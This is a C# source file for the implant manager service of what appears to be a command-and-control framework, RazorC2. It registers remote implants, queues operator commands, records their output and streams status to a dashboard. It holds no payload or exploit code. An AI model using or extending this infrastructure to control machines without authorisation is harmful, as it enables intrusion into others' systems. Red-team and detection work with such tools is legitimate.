// Services/ImplantManagerService.cs
using RazorC2.Models;
using System.Collections.Concurrent;
using Microsoft.AspNetCore.SignalR; // <-- Add SignalR namespace
using RazorC2.Hubs;       // <-- Add Hubs namespace
using System.Net; // To potentially get C2 base URL
using Microsoft.Extensions.Logging; // Ensure ILogger is available
using System.Threading.Tasks;     // Ensure Task is available


namespace RazorC2.Services
{
    // Use Singleton lifetime for this service
    public class ImplantManagerService
    {
        // Define the staleness threshold (in minutes) - make it easily configurable if needed later
        private const double StaleThresholdMinutes = 30.0;

        // Thread-safe dictionary to store implant info (Key: ImplantId)
        private readonly ConcurrentDictionary<string, ImplantInfo> _implants = new();
        private readonly ConcurrentDictionary<string, DateTime> _recentlyBroadcastedTasks =new ConcurrentDictionary<string, DateTime>();
        private readonly ConcurrentQueue<ServerLogEntry> _logMessages = new();

        private readonly IHubContext<DashboardHub> _hubContext; 
        private readonly IConfiguration _configuration;
        private readonly ILogger<ImplantManagerService> _logger; 

        public ImplantManagerService(IHubContext<DashboardHub> hubContext, IConfiguration configuration, ILogger<ImplantManagerService> logger)
        {
            _hubContext = hubContext;
            _configuration = configuration;
            _logger = logger; 

        }

        // Add a helper method to get the CURRENT listener URL
        public string GetCurrentListenerUrl()
        {
            try
            {
                // Read the CURRENT values from configuration. Assume config might be reloaded.
                string listenerIp = _configuration.GetValue<string>("Listeners:Implant:IpAddress") ?? "127.0.0.1";
                int listenerPort = _configuration.GetValue<int?>("Listeners:Implant:Port") ?? 8080; // Use correct default port
                return $"http://{listenerIp}:{listenerPort}";
            }
            catch (Exception ex)
            {
                // Log error and return a fallback if needed
                _logger.LogError(ex, "Error retrieving current listener URL from configuration.");
                return "http://127.0.0.1:8080"; // Sensible fallback
            }
        }

        public static class HashHelper
        {
            public static string ShortenHash(string fullHash)
            {
                if (string.IsNullOrEmpty(fullHash))
                    return "???";
                return fullHash.Substring(0, Math.Min(8, fullHash.Length));
            }
        }

        // Add this to the ImplantManagerService class
        private string NormalizeIpAddress(string? ipAddress)
        {
            if (string.IsNullOrEmpty(ipAddress))
                return "Unknown";

            try
            {
                // Try to parse the IP address
                if (IPAddress.TryParse(ipAddress, out var parsedIp))
                {
                    // Check if it's an IPv6 address mapped to IPv4
                    if (parsedIp.IsIPv4MappedToIPv6)
                    {
                        // Convert to IPv4 representation
                        return parsedIp.MapToIPv4().ToString();
                    }

                    // Check if it's a loopback IPv6 address (::1)
                    if (IPAddress.IsLoopback(parsedIp) && parsedIp.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
                    {
                        return "127.0.0.1";
                    }
                }

                return ipAddress;
            }
            catch
            {
                return ipAddress ?? "Unknown";
            }
        }

        public ImplantInfo RegisterOrUpdateImplant(string? implantId, string? remoteIp, ImplantRegistrationInfo regInfo)
        {
            // Normalize the IP address to prefer IPv4 format
            string normalizedIp = NormalizeIpAddress(remoteIp);
            bool isNew = false;
            bool wasStale = false;

            var now = DateTime.UtcNow;

            var implant = _implants.AddOrUpdate(implantId ?? Guid.NewGuid().ToString("N"), // Use ?? for potential new ID
                                                                                           
                (newId) =>
                {
                    _logger.LogInformation($"New implant registered: {HashHelper.ShortenHash(newId)} from {normalizedIp}");
                    isNew = true; // Mark as new
                    return new ImplantInfo
                    {
                        Id = newId,
                        RemoteAddress = normalizedIp,
                        Hostname = regInfo?.Hostname,
                        Username = regInfo?.Username,
                        ProcessName = regInfo?.ProcessName,
                        ProcessId = regInfo?.ProcessId ?? 0,
                        FirstSeen = now,
                        LastSeen = now // Set last seen immediately
                    };
                },
                // --- Update function (for EXISTING implants) ---
                (id, existingImplant) =>
                {
                    // *** Check if it WAS stale BEFORE updating LastSeen ***
                    wasStale = (now - existingImplant.LastSeen).TotalMinutes > StaleThresholdMinutes;
                    if (wasStale)
                    {
                        _logger.LogInformation($"Stale implant reconnected: {HashHelper.ShortenHash(id)} from {normalizedIp}");
                    }

                    // Update details
                    existingImplant.LastSeen = now; // Update last seen time
                    existingImplant.RemoteAddress = normalizedIp;
                    existingImplant.Hostname = regInfo?.Hostname ?? existingImplant.Hostname;
                    existingImplant.Username = regInfo?.Username ?? existingImplant.Username;
                    existingImplant.ProcessName = regInfo?.ProcessName ?? existingImplant.ProcessName;
                    existingImplant.ProcessId = regInfo?.ProcessId ?? existingImplant.ProcessId;
                    return existingImplant;
                });

            // *** Broadcast the general list update ***
            _ = Task.Run(() => BroadcastActiveImplantList());

            // *** Broadcast specific check-in notification if NEW or was STALE ***
            if (isNew || wasStale)
            {
                // Run this broadcast in the background as well
                _ = Task.Run(() => BroadcastNewCheckin(implant));
            }

            return implant;
        }

        // --- NEW Broadcast Method ---
        private async Task BroadcastNewCheckin(ImplantInfo implant)
        {
            if (implant == null) return;
            _logger.LogInformation($"[SignalR] Broadcasting NewImplantCheckin for {HashHelper.ShortenHash(implant.Id)}");
            try
            {
                // Send only the necessary info to the client popup
                await _hubContext.Clients.All.SendAsync("NewImplantCheckin", new
                {
                    implant.Id, // Send ID for potential linking?
                    implant.Hostname,
                    RemoteAddress = implant.RemoteAddress, // Ensure this property name matches ImplantInfo
                    implant.Username,
                    CheckinTime = implant.LastSeen // Use the updated LastSeen time
                });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"[ERROR] Failed to broadcast NewImplantCheckin via SignalR for {HashHelper.ShortenHash(implant.Id)}");
            }
        }

        public ImplantInfo? GetImplant(string implantId)
        {
            _implants.TryGetValue(implantId, out var implant);
            return implant;
        }

        public IEnumerable<ImplantInfo> GetAllImplants()
        {
            return _implants.Values;
        }

        public bool QueueCommand(string implantId, string commandText)
        {
            if (string.IsNullOrWhiteSpace(commandText)) return false; // Ignore empty commands

            if (_implants.TryGetValue(implantId, out var implant))
            {
                var task = new CommandTask
                {
                    CommandText = commandText,
                    IssuedAt = DateTime.UtcNow, // Set creation time
                    Status = CommandStatus.Pending
                };

                // Add to the history FIRST (ensures it's tracked)
                // Lock access to the history list for thread safety
                lock (implant.CommandHistory) 
                {
                    // Optional: Limit history size per implant - let's not do that
                    // if (implant.CommandHistory.Count > 200) { implant.CommandHistory.RemoveAt(0); }
                    implant.CommandHistory.Add(task);
                }

                // Then add to the queue for the implant to pick up
                implant.PendingCommands.Enqueue(task);

                // Log sleep commands specifically
                if (commandText.StartsWith("sleep ", StringComparison.OrdinalIgnoreCase))
                {
                    string[] parts = commandText.Split(new[] { ' ' }, 2);
                    if (parts.Length > 1 && int.TryParse(parts[1], out int seconds))
                    {
                        
                    }
                }

                //Log($"Command queued for {implantId} (CmdId: {task.CommandId}): {commandText}");
                return true;
            }
            //Log($"Failed to queue command for unknown implant: {implantId}");
            return false;
        }

        public CommandTask? GetPendingCommand(string implantId)
        {
            if (_implants.TryGetValue(implantId, out var implant))
            {
                if (implant.PendingCommands.TryDequeue(out var task))
                {
                    task.SentToImplantAt = DateTime.UtcNow; // Record when it was actually sent
                    Log($"Command issued to {HashHelper.ShortenHash(implantId)} (CmdId: {HashHelper.ShortenHash(task.CommandId)}): {task.CommandText}");
                    // Update the status in the persistent history list
                    lock (implant.CommandHistory)
                    {
                        var historyTask = implant.CommandHistory.FirstOrDefault(t => t.CommandId == task.CommandId);
                        if (historyTask != null)
                        {
                            historyTask.Status = CommandStatus.Issued;
                            historyTask.SentToImplantAt = task.SentToImplantAt; // Sync timestamp
                        }
                        else
                        {
                            // Should not happen if QueueCommand works correctly, but log if it does
                            Log($"Error: Dequeued command {HashHelper.ShortenHash(task.CommandId)} not found in history for implant {HashHelper.ShortenHash(implantId)}.");
                        }
                    }

                    _ = Task.Run(() => BroadcastCommandTaskUpdate(implantId, task));
                    return task; // Return the command to the implant
                }
            }
            return null; // No command available
        }

        public void RecordCommandResult(string implantId, CommandResult result)
        {
            if (result == null || string.IsNullOrEmpty(result.CommandId))
            {
                Log($"Error: Received result from {HashHelper.ShortenHash(implantId)} with missing CommandId.");
                return;
            }

            if (_implants.TryGetValue(implantId, out var implant))
            {
                implant.LastSeen = DateTime.UtcNow; // Update last seen on result submission
                CommandTask? historyTask = null;

                // Find the command in the history and update it
                lock (implant.CommandHistory)
                {
                    historyTask = implant.CommandHistory.FirstOrDefault(t => t.CommandId == result.CommandId);
                    if (historyTask != null)
                    {
                        historyTask.Result = result.Output ?? string.Empty;
                        historyTask.Status = result.HasError ? CommandStatus.Error : CommandStatus.Completed;
                        historyTask.CompletedAt = DateTime.UtcNow;
                    }
                } // Release lock

                // Add the sleep time handling code HERE - after the lock block but still within the implant check
                if (historyTask != null &&
                    historyTask.CommandText.StartsWith("sleep ", StringComparison.OrdinalIgnoreCase) &&
                    !result.HasError)
                {
                    string[] parts = historyTask.CommandText.Split(new[] { ' ' }, 2);
                    if (parts.Length > 1 && int.TryParse(parts[1], out int seconds))
                    {
                        implant.CurrentSleepTime = seconds;
                    }
                }

                if (historyTask != null)
                {
                    string statusString = result.HasError ? "Error" : "Completed";
                    string logOutput = Truncate(result.Output, 100); // Truncate for logging
                                                                     //Log($"Result from {implantId} (CmdId: {result.CommandId}): Status={statusString}, Output='{logOutput}'");
                    _ = Task.Run(() => BroadcastCommandTaskUpdate(implantId, historyTask));
                }
                else
                {
                    Log($"Warning: Received result for unknown/missing CommandId {HashHelper.ShortenHash(result.CommandId)} from implant {HashHelper.ShortenHash(implantId)}.");
                }
            }
            else
            {
                Log($"Warning: Result received from unknown implant: {HashHelper.ShortenHash(implantId)} for CommandId {HashHelper.ShortenHash(result.CommandId)}");
            }

            // *** Broadcast update AFTER result is recorded (LastSeen changed) ***
            _ = Task.Run(() => BroadcastImplantListUpdate());
            // Logs are updated separately via the Log() method call within RecordCommandResult
        }


        public IEnumerable<CommandTask> GetCommandHistory(string implantId)
        {
            if (_implants.TryGetValue(implantId, out var implant))
            {
                // Return a snapshot of the history, ordered by issue time for the terminal view
                lock (implant.CommandHistory)
                {
                    // Order by IssuedAt time so terminal shows commands in the order they were typed
                    return implant.CommandHistory.OrderBy(t => t.IssuedAt).ToList();
                }
            }
            return Enumerable.Empty<CommandTask>(); // Return empty list if implant not found
        }


        public void Log(string message)
        {
            // Log using ILogger
            _logger.LogInformation(message); // Or LogWarning, LogError as appropriate

            // Keep the console logging for immediate visibility if desired
            // Console.WriteLine($"[{DateTime.UtcNow:HH:mm:ss.fff}] {message}");

            // Keep SignalR broadcast
            const int maxLogMessages = 1000;
            while (_logMessages.Count >= maxLogMessages) { _logMessages.TryDequeue(out _); }
            var entry = new ServerLogEntry { Timestamp = DateTime.UtcNow, Message = message };
            _logMessages.Enqueue(entry);
            _ = Task.Run(() => BroadcastNewLogEntry(entry));
        }

        public IEnumerable<ServerLogEntry> GetLogMessages()
        {
            return _logMessages.OrderByDescending(l => l.Timestamp);
        }

        private static string Truncate(string? value, int maxLength)
        {
            if (string.IsNullOrEmpty(value)) return string.Empty;
            value = value.Replace("\r", "\\r").Replace("\n", "\\n"); // Make newlines visible in log
            return value.Length <= maxLength ? value : value.Substring(0, maxLength) + "...";
        }

        private async Task BroadcastImplantListUpdate()
        {
            try
            {
                var implants = GetAllImplants(); // Get current list
                                                 // Send to ALL connected UI clients
                await _hubContext.Clients.All.SendAsync("UpdateImplantList", implants);
            }
            catch (Exception ex)
            {
                // Log error but don't crash the service
                Console.WriteLine($"[ERROR] Failed to broadcast implant list update via SignalR: {ex.Message}");
            }
        }

        private async Task BroadcastActiveImplantList()
        {
            try
            {
                var implants = GetAllImplants();
                await _hubContext.Clients.All.SendAsync("UpdateImplantList", implants);
            }
            catch (Exception ex) { Console.WriteLine($"[ERROR] BroadcastActiveImplantList: {ex.Message}"); }
        }

        // Broadcasts a specific command task status update
        //Deduplication
        private async Task BroadcastCommandTaskUpdate(string implantId, CommandTask task)
        {
            try
            {
                // Create a unique key combining implantId, taskId and status
                string dedupeKey = $"{implantId}:{task.CommandId}:{task.Status}";

                // Check if we've sent this exact update in the last second
                if (_recentlyBroadcastedTasks.TryGetValue(dedupeKey, out var lastBroadcast))
                {
                    if ((DateTime.UtcNow - lastBroadcast).TotalSeconds < 1)
                    {
                        // Skip duplicate broadcast if it's within 1 second of the last one
                        Console.WriteLine($"[DEBUG] Skipping duplicate broadcast for {dedupeKey}");
                        return;
                    }
                }

                // Record this broadcast
                _recentlyBroadcastedTasks[dedupeKey] = DateTime.UtcNow;

                // Clean up old entries (optional, prevents memory growth)
                var keysToRemove = _recentlyBroadcastedTasks
                    .Where(kvp => (DateTime.UtcNow - kvp.Value).TotalMinutes > 5)
                    .Select(kvp => kvp.Key)
                    .ToList();

                foreach (var key in keysToRemove)
                {
                    _recentlyBroadcastedTasks.TryRemove(key, out _);
                }

                // Send the update as normal
                await _hubContext.Clients.All.SendAsync("CommandTaskUpdated",
                    new { ImplantId = implantId, Task = task });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] BroadcastCommandTaskUpdate: {ex.Message}");
            }
        }

        // Broadcasts a single new log entry
        private async Task BroadcastNewLogEntry(ServerLogEntry logEntry)
        {
            try
            {
                await _hubContext.Clients.All.SendAsync("AppendLogEntry", logEntry);
            }
            catch (Exception ex) { Console.WriteLine($"[ERROR] BroadcastNewLogEntry: {ex.Message}"); }
        }

        public bool RemoveImplant(string implantId)
        {
            bool removed = _implants.TryRemove(implantId, out _);
            if (removed)
            {
                Log($"Implant removed via UI: {implantId}");
                // Broadcast the updated list so the UI removes the row
                _ = Task.Run(() => BroadcastActiveImplantList());
            }
            else
            {
                Log($"Attempted to remove non-existent implant via UI: {HashHelper.ShortenHash(implantId)}");
            }
            return removed;
        }

    }

    // Helper models for service methods
    public class ImplantRegistrationInfo
    {
        public string? Hostname { get; set; }
        public string? Username { get; set; }
        public string? ProcessName { get; set; }
        public int? ProcessId { get; set; }
    }

    public class ServerLogEntry
    {
        public DateTime Timestamp { get; set; }
        public string Message { get; set; } = string.Empty;
    }
}